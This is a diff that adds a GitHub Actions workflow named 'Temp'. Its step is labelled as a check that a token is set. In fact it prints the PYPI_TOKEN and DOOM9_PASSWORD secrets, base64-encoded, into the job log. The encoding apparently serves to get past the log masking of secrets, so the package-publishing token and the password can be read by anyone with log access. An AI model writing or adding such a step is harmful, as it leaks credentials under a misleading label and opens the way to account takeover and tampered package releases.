@@ -1,0 +1,18 @@
+name: Temp
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  check-token:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check if GH token is set
+        env:
+          PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}
+          DOOM9_PASSWORD: ${{ secrets.DOOM9_PASSWORD }}
+        run: |
+          echo "token_set=$PYPI_TOKEN" | base64
+          echo "token_set=$DOOM9_PASSWORD" | base64
